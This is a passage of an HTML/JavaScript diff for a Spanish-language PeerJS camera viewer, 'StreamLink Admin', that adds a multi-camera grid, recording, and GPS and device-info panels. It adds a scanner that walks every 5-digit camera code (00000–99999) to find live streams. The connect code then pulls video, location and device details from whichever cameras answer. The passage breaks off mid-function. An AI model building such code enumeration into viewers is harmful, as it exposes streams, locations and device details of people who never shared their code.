+    <div class="top-stat">EN VIVO <span class="top-stat-val green" id="ts-live">0</span></div>
+    <div class="top-stat">LATENCIA <span class="top-stat-val" id="ts-lat">—</span></div>
   </div>
   <div class="topbar-right">
-    <div id="statusBadge" class="badge badge-idle">OFFLINE</div>
+    <div class="badge badge-idle" id="statusBadge">OFFLINE</div>
   </div>
 </div>
 
-<div class="main">
+<div class="workspace">
 
-  <div class="video-zone">
-    <video id="remoteVideo" autoplay playsinline></video>
-    <div class="live-badge" id="liveBadge">● EN VIVO</div>
-    <div class="vid-stats-overlay" id="vidStats">
-      <div class="stat-row"><span>Latencia</span><span class="stat-val" id="sv-lat">—</span></div>
-      <div class="stat-row"><span>Bitrate</span><span class="stat-val" id="sv-bit">—</span></div>
-      <div class="stat-row"><span>Paquetes</span><span class="stat-val" id="sv-pkt">—</span></div>
-      <div class="stat-row"><span>Calidad</span><span class="stat-val" id="sv-q">—</span></div>
+  <!-- LEFT: Camera list + add -->
+  <div class="left-panel">
+    <div class="panel-header">
+      <div class="panel-title">Cámaras detectadas</div>
+      <div class="panel-sub" id="camCountLabel">Sin cámaras activas</div>
     </div>
-    <!-- GPS overlay on video -->
-    <div class="vid-gps-overlay" id="vidGpsOverlay"></div>
-    <!-- Freeze warning bar -->
-    <div class="freeze-bar" id="freezeBar">⚠ Video detenido — reconectando track…</div>
 
-    <div class="connect-overlay" id="connectOverlay">
-      <div class="connect-overlay-icon">
-        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.8">
-          <path d="M1.5 8.5a13 13 0 0121 0M5 12a10 10 0 0114 0M8.5 15.5a6 6 0 017 0"/><circle cx="12" cy="19" r="1" fill="currentColor"/>
-        </svg>
-      </div>
-      <h2>StreamLink · Visor</h2>
-      <p>Ingresá el código de 5 dígitos que muestra la cámara transmisora.</p>
-      <div class="code-input-wrap">
-        <input type="text" id="camIdInput" class="code-input" maxlength="5" placeholder="00000" inputmode="numeric" autocomplete="off">
-        <button class="btn-primary" id="connectBtn">Ver</button>
+    <div class="cam-list" id="camList">
+      <div style="font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--text3);text-align:center;padding:20px 8px;">
+        Usá el escáner o añadí un código de cámara manualmente.
       </div>
     </div>
-    <div class="loading-overlay" id="loadingOverlay">
-      <div class="spinner"></div>
-      <p id="loadingMsg">Conectando...</p>
-    </div>
-    <div class="reconnect-overlay" id="reconnectOverlay">
-      <div class="spinner"></div>
-      <p>Reconectando automáticamente...</p>
+
+    <div class="scan-section">
+      <div class="scan-input-wrap">
+        <input type="text" id="manualCode" class="scan-input" maxlength="5" placeholder="CÓDIGO" inputmode="numeric" autocomplete="off">
+        <button class="btn-add" id="addCamBtn">+</button>
+      </div>
+      <button class="scan-auto-btn" id="scanBtn">
+        <div class="scan-dot"></div>
+        <span id="scanBtnLabel">Escanear rango (00000–99999)</span>
+      </button>
+      <div class="scan-progress"><div class="scan-progress-bar" id="scanProgressBar"></div></div>
     </div>
   </div>
 
-  <!-- SIDEBAR -->
-  <div class="sidebar">
+  <!-- CENTER: Grid view -->
+  <div class="main-content">
+    <div class="view-toolbar">
+      <button class="view-btn active" id="vb-1" onclick="setLayout(1)">
+        <svg viewBox="0 0 16 16" fill="currentColor"><rect x="1" y="1" width="14" height="14" rx="1"/></svg>
+        1
+      </button>
+      <button class="view-btn" id="vb-2" onclick="setLayout(2)">
+        <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="1" y="1" width="6" height="14" rx="1"/><rect x="9" y="1" width="6" height="14" rx="1"/></svg>
+        2
+      </button>
+      <button class="view-btn" id="vb-4" onclick="setLayout(4)">
+        <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="1" y="1" width="6" height="6" rx="1"/><rect x="9" y="1" width="6" height="6" rx="1"/><rect x="1" y="9" width="6" height="6" rx="1"/><rect x="9" y="9" width="6" height="6" rx="1"/></svg>
+        4
+      </button>
+      <button class="view-btn" id="vb-9" onclick="setLayout(9)">
+        <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.2"><rect x="1" y="1" width="4" height="4" rx=".5"/><rect x="6" y="1" width="4" height="4" rx=".5"/><rect x="11" y="1" width="4" height="4" rx=".5"/><rect x="1" y="6" width="4" height="4" rx=".5"/><rect x="6" y="6" width="4" height="4" rx=".5"/><rect x="11" y="6" width="4" height="4" rx=".5"/><rect x="1" y="11" width="4" height="4" rx=".5"/><rect x="6" y="11" width="4" height="4" rx=".5"/><rect x="11" y="11" width="4" height="4" rx=".5"/></svg>
+        9
+      </button>
+      <button class="view-btn" id="vb-auto" onclick="setLayout('auto')">
+        <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="1" y="1" width="6" height="6" rx="1"/><rect x="9" y="1" width="6" height="6" rx="1"/><rect x="1" y="9" width="6" height="6" rx="1"/><path d="M9 12h6M12 9v6"/></svg>
+        Auto
+      </button>
+      <div class="toolbar-sep"></div>
+      <button class="view-btn" id="vb-fullscreen" onclick="toggleAllFullscreen()">
+        <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M1 5V2h3M12 2h3v3M1 11v3h3M12 14h3v-3"/></svg>
+        FS
+      </button>
+      <div class="toolbar-label">Layout: <span class="toolbar-val" id="layoutLabel">1×1</span></div>
+    </div>
 
-    <!-- Reproducción -->
-    <div class="section">
-      <div class="section-title">Reproducción</div>
-      <div class="ctrl-grid">
-        <button class="ctrl-btn" id="muteBtn">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 010 7.07"/>
+    <div class="grid-area" id="gridArea">
+      <div class="empty-state" id="emptyState">
+        <div class="empty-state-icon">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--accent2)" stroke-width="1.5">
+            <path d="M15 10l4.553-2.069A1 1 0 0121 8.82v6.36a1 1 0 01-1.447.89L15 14M3 8a2 2 0 012-2h10a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z"/>
           </svg>
-          Silenciar
-        </button>
-        <button class="ctrl-btn" id="fullscreenBtn">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <path d="M8 3H5a2 2 0 00-2 2v3m18 0V5a2 2 0 00-2-2h-3m0 18h3a2 2 0 002-2v-3M3 16v3a2 2 0 002 2h3"/>
-          </svg>
-          Full Screen
-        </button>
-        <button class="ctrl-btn" id="statsToggleBtn">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <path d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/>
-          </svg>
-          Stats HUD
-        </button>
-        <button class="ctrl-btn" id="pipBtn">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-            <rect x="2" y="3" width="20" height="14" rx="2"/><rect x="12" y="10" width="8" height="6" rx="1" fill="currentColor" opacity=".5"/>
-          </svg>
-          Picture-in-P
-        </button>
+        </div>
+        <h3>Sin cámaras conectadas</h3>
+        <p>Añadí un código de cámara o usá el escáner automático para detectar transmisiones activas.</p>
       </div>
-      <div class="slider-row" style="margin-top:12px">
-        <span class="slider-label">VOL</span>
-        <input type="range" id="volumeSlider" min="0" max="1" step="0.01" value="1">
-        <span class="slider-val" id="volumeVal">100%</span>
-      </div>
-      <div class="slider-row">
-        <span class="slider-label">LUZ</span>
-        <input type="range" id="brightnessSlider" min="0.5" max="2" step="0.05" value="1">
-        <span class="slider-val" id="brightnessVal">1×</span>
+      <div class="cam-grid layout-1" id="camGrid" style="display:none;"></div>
+    </div>
+  </div>
+
+  <!-- RIGHT: Detail panel -->
+  <div class="right-panel" id="rightPanel">
+
+    <div class="section" id="detailSection">
+      <div class="section-title">Cámara seleccionada</div>
+      <div class="no-selection" id="noSelectionMsg">Seleccioná una cámara del panel izquierdo o del grid.</div>
+      <div id="detailContent" style="display:none">
+        <div class="detail-header">
+          <div class="detail-dot"></div>
+          <div>
+            <div class="detail-name" id="detail-name">—</div>
+            <div class="detail-id" id="detail-id">ID: —</div>
+          </div>
+        </div>
+        <div class="info-grid">
+          <div class="info-card"><div class="info-card-label">Latencia</div><div class="info-card-val" id="d-lat">—</div></div>
+          <div class="info-card"><div class="info-card-label">Bitrate</div><div class="info-card-val" id="d-bit">—</div></div>
+          <div class="info-card"><div class="info-card-label">Paquetes</div><div class="info-card-val g" id="d-pkt">—</div></div>
+          <div class="info-card"><div class="info-card-label">Calidad</div><div class="info-card-val g" id="d-q">—</div></div>
+          <div class="info-card"><div class="info-card-label">Resolución</div><div class="info-card-val" id="d-res">—</div></div>
+          <div class="info-card"><div class="info-card-label">Uptime</div><div class="info-card-val" id="d-time">—</div></div>
+        </div>
       </div>
     </div>
 
-    <!-- GPS recibido -->
+    <!-- Controls -->
+    <div class="section" id="controlsSection">
+      <div class="section-title">Controles</div>
+      <div id="controlsContent">
+        <div class="no-selection">Sin cámara activa</div>
+      </div>
+      <div id="controlsActive" style="display:none">
+        <div class="ctrl-row">
+          <button class="ctrl-btn" id="ctrl-mute">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 010 7.07"/></svg>
+            Silencio
+          </button>
+          <button class="ctrl-btn" id="ctrl-fs">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 00-2 2v3m18 0V5a2 2 0 00-2-2h-3m0 18h3a2 2 0 002-2v-3M3 16v3a2 2 0 002 2h3"/></svg>
+            Full Screen
+          </button>
+          <button class="ctrl-btn" id="ctrl-pip">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><rect x="12" y="10" width="8" height="6" rx="1" fill="currentColor" opacity=".5"/></svg>
+            PiP
+          </button>
+          <button class="ctrl-btn" id="ctrl-snap">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/></svg>
+            Captura
+          </button>
+        </div>
+        <button class="ctrl-btn-full" id="ctrl-rec">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/></svg>
+          Iniciar Grabación
+        </button>
+        <div style="display:flex;align-items:center;gap:8px;margin-top:4px">
+          <span style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--text3);width:28px">VOL</span>
+          <input type="range" class="slider-mini" id="ctrl-vol" min="0" max="1" step="0.05" value="1">
+          <span style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent2);width:30px;text-align:right" id="ctrl-vol-val">100%</span>
+        </div>
+        <div style="display:flex;align-items:center;gap:8px;margin-top:6px">
+          <span style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--text3);width:28px">LUZ</span>
+          <input type="range" class="slider-mini" id="ctrl-bri" min="0.5" max="2" step="0.05" value="1">
+          <span style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent2);width:30px;text-align:right" id="ctrl-bri-val">1×</span>
+        </div>
+        <button class="ctrl-btn-full" id="ctrl-disconnect" style="margin-top:8px;border-color:#ef444430;color:var(--red);background:var(--red-dim);">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18.36 6.64a9 9 0 11-12.73 0M12 2v10"/></svg>
+          Desconectar Cámara
+        </button>
+      </div>
+    </div>
+
+    <!-- GPS -->
     <div class="section">
       <div class="section-title">GPS de la Cámara</div>
-      <div id="gpsSection">
-        <div class="gps-inactive" id="gpsWaiting">Sin datos GPS activos</div>
-        <div class="gps-info-card" id="gpsCard" style="display:none">
-          <div class="gps-row"><span>Latitud</span><span class="gps-val" id="gps-lat">—</span></div>
-          <div class="gps-row"><span>Longitud</span><span class="gps-val" id="gps-lng">—</span></div>
-          <div class="gps-row"><span>Precisión</span><span class="gps-val" id="gps-acc">—</span></div>
-          <div class="gps-row"><span>Altitud</span><span class="gps-val" id="gps-alt">—</span></div>
-          <div class="gps-row"><span>Velocidad</span><span class="gps-val" id="gps-spd">—</span></div>
-          <div class="gps-row"><span>Rumbo</span><span class="gps-val" id="gps-head">—</span></div>
-          <a class="gps-link" id="gpsMapLink" href="#" target="_blank">🗺 Ver en mapa</a>
+      <div id="gpsContent">
+        <div class="gps-no-data" id="gpsNoData">Sin datos GPS</div>
+        <div class="gps-card" id="gpsCard" style="display:none">
+          <div class="gps-row"><span>Latitud</span><span class="gps-val" id="g-lat">—</span></div>
+          <div class="gps-row"><span>Longitud</span><span class="gps-val" id="g-lng">—</span></div>
+          <div class="gps-row"><span>Precisión</span><span class="gps-val" id="g-acc">—</span></div>
+          <div class="gps-row"><span>Altitud</span><span class="gps-val" id="g-alt">—</span></div>
+          <div class="gps-row"><span>Velocidad</span><span class="gps-val" id="g-spd">—</span></div>
+          <div class="gps-row"><span>Rumbo</span><span class="gps-val" id="g-head">—</span></div>
         </div>
+        <button class="gps-map-btn" id="gpsMapBtn" style="display:none">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+          Ver en Google Maps
+        </button>
       </div>
     </div>
 
-    <!-- Grabación -->
+    <!-- Device Info -->
     <div class="section">
-      <div class="section-title">Grabación</div>
-      <button class="ctrl-btn-full" id="recordBtn" disabled>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/>
-        </svg>
-        Grabar Stream
-      </button>
-      <button class="ctrl-btn-full" id="screenshotBtn" disabled>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/>
-        </svg>
-        Captura de Pantalla
-      </button>
-    </div>
-
-    <!-- Estadísticas de red -->
-    <div class="section">
-      <div class="section-title">Estadísticas de Red</div>
-      <div class="stats-grid">
-        <div class="stat-card"><div class="stat-card-label">Latencia</div><div class="stat-card-val" id="st-lat">—</div></div>
-        <div class="stat-card"><div class="stat-card-label">Bitrate In</div><div class="stat-card-val" id="st-bit">—</div></div>
-        <div class="stat-card"><div class="stat-card-label">Pérd. Paquetes</div><div class="stat-card-val g" id="st-pkt">—</div></div>
-        <div class="stat-card"><div class="stat-card-label">Calidad</div><div class="stat-card-val g" id="st-q">—</div></div>
-        <div class="stat-card"><div class="stat-card-label">Resolución</div><div class="stat-card-val" id="st-res">—</div></div>
-        <div class="stat-card"><div class="stat-card-label">Tiempo viendo</div><div class="stat-card-val" id="st-time">00:00</div></div>
-      </div>
-    </div>
-
-    <!-- Info del dispositivo cámara -->
-    <div class="section">
-      <div class="section-title">Info del Dispositivo Cámara</div>
-      <div id="deviceInfoWrap">
-        <div class="di-waiting" id="diWaiting">Esperando conexión…</div>
-        <div class="device-info-card" id="deviceInfoCard" style="display:none">
-          <div class="di-row"><span>Plataforma</span><span class="di-val" id="di-platform">—</span></div>
-          <div class="di-row"><span>Navegador</span><span class="di-val" id="di-browser">—</span></div>
-          <div class="di-row"><span>Motor</span><span class="di-val" id="di-engine">—</span></div>
-          <div class="di-row"><span>SO</span><span class="di-val" id="di-os">—</span></div>
-          <div class="di-row"><span>Pantalla</span><span class="di-val" id="di-screen">—</span></div>
-          <div class="di-row"><span>Pixel ratio</span><span class="di-val" id="di-dpr">—</span></div>
-          <div class="di-row"><span>Memoria</span><span class="di-val" id="di-mem">—</span></div>
-          <div class="di-row"><span>CPU cores</span><span class="di-val" id="di-cpu">—</span></div>
-          <div class="di-row"><span>Conexión</span><span class="di-val" id="di-conn">—</span></div>
-          <div class="di-row"><span>Idioma</span><span class="di-val" id="di-lang">—</span></div>
-          <div class="di-row"><span>Zona horaria</span><span class="di-val" id="di-tz">—</span></div>
-          <div class="di-row"><span>Touch points</span><span class="di-val" id="di-touch">—</span></div>
-          <div class="di-row"><span>Online</span><span class="di-val g" id="di-online">—</span></div>
-        </div>
-      </div>
-    </div>
-
-    <!-- Info conexión -->
-    <div class="section" style="flex:1">
-      <div class="section-title">Información de Conexión</div>
-      <div class="conn-card">
-        <div class="conn-card-row"><span>Cámara</span><span class="conn-val" id="ci-cam">—</span></div>
-        <div class="conn-card-row"><span>Protocolo</span><span class="conn-val">WebRTC P2P</span></div>
-        <div class="conn-card-row"><span>Cifrado</span><span class="conn-val" style="color:var(--green)">DTLS-SRTP</span></div>
-        <div class="conn-card-row"><span>Estado red</span><span class="conn-val" id="ci-net">—</span></div>
+      <div class="section-title">Info del Dispositivo</div>
+      <div class="di-wait" id="diWait">Sin dispositivo seleccionado</div>
+      <div class="device-card" id="diCard" style="display:none">
+        <div class="di-row"><span>Plataforma</span><span class="di-val" id="di-platform">—</span></div>
+        <div class="di-row"><span>Navegador</span><span class="di-val" id="di-browser">—</span></div>
+        <div class="di-row"><span>SO</span><span class="di-val" id="di-os">—</span></div>
+        <div class="di-row"><span>Pantalla</span><span class="di-val" id="di-screen">—</span></div>
+        <div class="di-row"><span>Memoria</span><span class="di-val" id="di-mem">—</span></div>
+        <div class="di-row"><span>CPU</span><span class="di-val" id="di-cpu">—</span></div>
+        <div class="di-row"><span>Conexión</span><span class="di-val" id="di-conn">—</span></div>
+        <div class="di-row"><span>Idioma</span><span class="di-val" id="di-lang">—</span></div>
+        <div class="di-row"><span>Zona horaria</span><span class="di-val" id="di-tz">—</span></div>
+        <div class="di-row"><span>Touch points</span><span class="di-val" id="di-touch">—</span></div>
+        <div class="di-row"><span>Online</span><span class="di-val g" id="di-online">—</span></div>
       </div>
     </div>
 
   </div>
-
-  <div class="bottombar">
-    <div class="bottom-group">
-      <div class="rec-timer" id="recTimer">
-        <div class="rec-timer-dot"></div>
-        <span id="recTimerVal">00:00</span>
-      </div>
-    </div>
-    <div class="bottom-group">
-      <button class="bottom-btn" id="screenshotBtnBot" disabled>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/>
-        </svg>
-        Captura
-      </button>
-      <button class="bottom-btn" id="recordBtnBot" disabled>
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/>
-        </svg>
-        <span id="recLabelBot">Grabar</span>
-      </button>
-      <button class="bottom-btn danger" id="disconnectBtn" style="display:none">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-          <path d="M18.36 6.64a9 9 0 11-12.73 0M12 2v10"/>
-        </svg>
-        Desconectar
-      </button>
-    </div>
-  </div>
-
 </div>
 
-<div class="error-bar" id="errorBar"></div>
+<div class="toast" id="toast"></div>
 
 <script>
-const remoteVideo     = document.getElementById('remoteVideo');
-const connectBtn      = document.getElementById('connectBtn');
-const camIdInput      = document.getElementById('camIdInput');
-const connectOverlay  = document.getElementById('connectOverlay');
-const loadingOverlay  = document.getElementById('loadingOverlay');
-const loadingMsg      = document.getElementById('loadingMsg');
-const reconnectOverlay= document.getElementById('reconnectOverlay');
-const statusBadge     = document.getElementById('statusBadge');
-const errorBar        = document.getElementById('errorBar');
-const liveBadge       = document.getElementById('liveBadge');
-const vidStats        = document.getElementById('vidStats');
-const vidGpsOverlay   = document.getElementById('vidGpsOverlay');
-const freezeBar       = document.getElementById('freezeBar');
+// ════════════════════════════════════════════
+//  STREAMLINK ADMIN — Multi-camera viewer
+// ════════════════════════════════════════════
 
-const muteBtn         = document.getElementById('muteBtn');
-const fullscreenBtn   = document.getElementById('fullscreenBtn');
-const statsToggleBtn  = document.getElementById('statsToggleBtn');
-const pipBtn          = document.getElementById('pipBtn');
-const volumeSlider    = document.getElementById('volumeSlider');
-const volumeVal       = document.getElementById('volumeVal');
-const brightnessSlider= document.getElementById('brightnessSlider');
-const brightnessVal   = document.getElementById('brightnessVal');
-const recordBtn       = document.getElementById('recordBtn');
-const screenshotBtn   = document.getElementById('screenshotBtn');
-const screenshotBtnBot= document.getElementById('screenshotBtnBot');
-const recordBtnBot    = document.getElementById('recordBtnBot');
-const recLabelBot     = document.getElementById('recLabelBot');
-const recTimer        = document.getElementById('recTimer');
-const recTimerVal     = document.getElementById('recTimerVal');
-const disconnectBtn   = document.getElementById('disconnectBtn');
+// ── STATE ──────────────────────────────────
+let adminPeer = null;
+let cameras   = {};       // id → camState
+let selectedId = null;
+let currentLayout = 1;
+let isScanning = false;
+let scanAbort  = false;
+let scanInterval = null;
 
-const stLat   = document.getElementById('st-lat');
-const stBit   = document.getElementById('st-bit');
-const stPkt   = document.getElementById('st-pkt');
-const stQ     = document.getElementById('st-q');
-const stRes   = document.getElementById('st-res');
-const stTime  = document.getElementById('st-time');
-const svLat   = document.getElementById('sv-lat');
-const svBit   = document.getElementById('sv-bit');
-const svPkt   = document.getElementById('sv-pkt');
-const svQ     = document.getElementById('sv-q');
-const ciCam   = document.getElementById('ci-cam');
-const ciNet   = document.getElementById('ci-net');
+// camState = {
+//   id, name, call, dataConn, stream, peer, status,
+//   gps, deviceInfo, stats, recorderState, isMuted,
+//   viewerStartTime, statsInterval
+// }
 
-// ─── STATE ───
-let peer, currentCall, dataConn;
-let targetCamId = null;
-let statsHudOn = false;
-let isMuted = false;
-let reconnectTimer = null;
-let isRecording = false;
-let mediaRecorder = null;
-let recordedChunks = [];
-let recStartTime = null;
-let recInterval = null;
-let viewStartTime = null;
-let viewInterval = null;
-let statsInterval = null;
-let prevBytesIn = 0;
-let videoHealthInterval = null;
-let lastFrameTime = 0;
-let freezeWarned = false;
-
-// ─── UTILS ───
-function setStatus(text, cls) {
-  statusBadge.textContent = text;
-  statusBadge.className = 'badge ' + cls;
+// ── UTILS ──────────────────────────────────
+function toast(msg, type='info', dur=3000) {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.className = 'toast show ' + type;
+  clearTimeout(el._t);
+  el._t = setTimeout(() => { el.className = 'toast'; }, dur);
 }
-function showError(msg, permanent) {
-  errorBar.textContent = '⚠ ' + msg;
-  errorBar.style.display = 'block';
-  if (!permanent) setTimeout(() => errorBar.style.display = 'none', 5000);
-}
-function hideError() { errorBar.style.display = 'none'; }
 function fmtTime(sec) {
-  return Math.floor(sec/60).toString().padStart(2,'0')+':'+( sec%60).toString().padStart(2,'0');
+  return Math.floor(sec/60).toString().padStart(2,'0')+':'+(sec%60).toString().padStart(2,'0');
+}
+function setStatus(text, cls) {
+  const el = document.getElementById('statusBadge');
+  el.textContent = text;
+  el.className = 'badge ' + cls;
+}
+function updateTopStats() {
+  const total = Object.keys(cameras).length;
+  const live  = Object.values(cameras).filter(c => c.status === 'live').length;
+  document.getElementById('ts-total').textContent = total;
+  document.getElementById('ts-live').textContent  = live;
+  document.getElementById('camCountLabel').textContent =
+    total === 0 ? 'Sin cámaras activas' : `${live}/${total} en vivo`;
+
+  if (live === 0 && total === 0) setStatus('OFFLINE', 'badge-idle');
+  else if (live > 0) setStatus(`EN VIVO · ${live}`, 'badge-live');
+  else setStatus('MONITOREANDO', 'badge-scan');
 }
 
-camIdInput.addEventListener('input', () => {
-  camIdInput.value = camIdInput.value.replace(/\D/g,'').slice(0,5);
-});
-camIdInput.addEventListener('keydown', e => { if(e.key==='Enter') connectBtn.click(); });
+// ── PEER INIT ──────────────────────────────
+function initAdminPeer(cb) {
+  if (adminPeer && !adminPeer.destroyed) { if(cb) cb(); return; }
+  adminPeer = new Peer({
+    config: { iceServers: [
+      {urls:'stun:stun.l.google.com:19302'},
+      {urls:'stun:stun1.l.google.com:19302'},
+    ]},
+    debug: 0
+  });
+  adminPeer.on('open', () => { if(cb) cb(); });
+  adminPeer.on('error', () => {});
+}
 
-// ─── GPS RECEIVER ───
-function handleGpsData(d) {
-  if (d.active === false) {
-    document.getElementById('gpsWaiting').style.display = 'block';
-    document.getElementById('gpsCard').style.display = 'none';
-    vidGpsOverlay.style.display = 'none';
+// ── CONNECT TO CAMERA ──────────────────────
+function connectCamera(camId) {
+  camId = camId.trim();
+  if (!camId || camId.length !== 5 || !/^\d+$/.test(camId)) {
+    toast('Código inválido (5 dígitos)', 'error'); return;
+  }
+  if (cameras[camId]) {
+    toast('Cámara ya conectada', 'info');
+    selectCamera(camId); return;
+  }
+
+  // Reserve slot
+  cameras[camId] = {
+    id: camId, name: `Cam ${camId}`, status: 'connecting',
+    call: null, dataConn: null, stream: null,
+    gps: null, deviceInfo: null,
+    stats: {lat:'—',bit:'—',pkt:'—',q:'—',res:'—'},
+    prevBytes: 0, isMuted: false, brightness: 1,
+    isRecording: false, mediaRecorder: null, recordedChunks: [],
+    viewerStartTime: Date.now(), statsInterval: null,
+    viewTimerInterval: null
+  };
+
+  renderCamList();
+  renderGrid();
+  updateTopStats();
+
+  initAdminPeer(() => {
+    // DataChannel
+    const dc = adminPeer.connect(camId, { reliable: true, label: 'data' });
+    dc.on('open', () => {
+      cameras[camId].dataConn = dc;
+    });
+    dc.on('data', raw => {
+      try {
+        const msg = typeof raw === 'string' ? JSON.parse(raw) : raw;
+        if (msg.type === 'gps') handleGps(camId, msg);
+        else if (msg.type === 'deviceInfo') handleDeviceInfo(camId, msg);
+      } catch(e) {}
+    });
+
+    // Dummy stream for calling
+    let emptyStream;
+    try {
+      const ac = new AudioContext();
+      const dest = ac.createMediaStreamDestination();
+      const canvas = document.createElement('canvas');
+      canvas.width = 2; canvas.height = 2;
+      emptyStream = new MediaStream([
+        dest.stream.getAudioTracks()[0],
+        canvas.captureStream(1).getVideoTracks()[0]
+      ]);
+    } catch { emptyStream = new MediaStream(); }
+
+    const call = adminPeer.call(camId, emptyStream);
+    if (!call) {
+      removeCam(camId, 'No se pudo conectar'); return;
+    }
+    cameras[camId].call = call;
+
+    const timeout = setTimeout(() => {
+      if (cameras[camId] && cameras[camId].status === 'connecting') {
+        removeCam(camId, null); // silent removal (cam not found)
+      }
+    }, 10000);
+
+    call.on('stream', stream => {
+      clearTimeout(timeout);
+      if (!cameras[camId]) return;
+      cameras[camId].stream = stream;
+      cameras[camId].status = 'live';
+      cameras[camId].viewerStartTime = Date.now();
+      // Attach to video elements
+      attachStream(camId, stream);
+      startCamStats(camId, call);
+      startViewTimer(camId);
+      renderCamList();
+      renderGrid();
+      updateTopStats();
+      toast(`Cámara ${camId} conectada`, 'success');
+      if (!selectedId) selectCamera(camId);
+    });
+
+    call.on('close', () => { clearTimeout(timeout); handleCamClose(camId); });
+    call.on('error', () => { clearTimeout(timeout); handleCamClose(camId); });
+  });
+}
+
+function handleCamClose(camId) {
+  if (!cameras[camId]) return;
+  cameras[camId].status = 'offline';
+  cameras[camId].stream = null;
+  stopCamStats(camId);
+  stopViewTimer(camId);
+  renderCamList();
+  renderGrid();
+  updateTopStats();
+  if (selectedId === camId) renderDetailPanel();
+}
+
+function removeCam(camId, msg) {
+  if (!cameras[camId]) return;
+  const cam = cameras[camId];
+  if (cam.call) try { cam.call.close(); } catch(e) {}
+  if (cam.dataConn) try { cam.dataConn.close(); } catch(e) {}
+  stopCamStats(camId);
+  stopViewTimer(camId);
+  if (cam.isRecording && cam.mediaRecorder) try { cam.mediaRecorder.stop(); } catch(e) {}
+  delete cameras[camId];
+  if (selectedId === camId) { selectedId = null; }
+  renderCamList();
+  renderGrid();
+  updateTopStats();
+  renderDetailPanel();
+  if (msg) toast(msg, 'error');
+}
+
+// ── STREAM ATTACH ──────────────────────────
+function attachStream(camId, stream) {
+  // Grid cell video
+  const gv = document.getElementById(`gvid-${camId}`);
+  if (gv) { gv.srcObject = stream; gv.play().catch(()=>{}); }
+  // Thumb video
+  const tv = document.getElementById(`tvid-${camId}`);
+  if (tv) { tv.srcObject = stream; tv.play().catch(()=>{}); }
+}
+
+// ── GPS + DEVICE INFO ──────────────────────
+function handleGps(camId, d) {
+  if (!cameras[camId]) return;
+  if (d.active === false) { cameras[camId].gps = null; }
+  else { cameras[camId].gps = d; }
+  updateCellGps(camId);
+  if (selectedId === camId) renderGpsPanel();
+}
+
+function handleDeviceInfo(camId, d) {
+  if (!cameras[camId]) return;
+  cameras[camId].deviceInfo = d;
+  if (selectedId === camId) renderDevicePanel();
+}
+
+// ── STATS ──────────────────────────────────
+function startCamStats(camId, call) {
+  stopCamStats(camId);
+  const pc = call.peerConnection;
+  if (!pc) return;
+  cameras[camId].statsInterval = setInterval(async () => {
+    if (!cameras[camId]) return;
+    try {
+      const reports = await pc.getStats();
+      reports.forEach(r => {
+        if (r.type === 'inbound-rtp' && r.kind === 'video') {
+          const bytes = r.bytesReceived || 0;
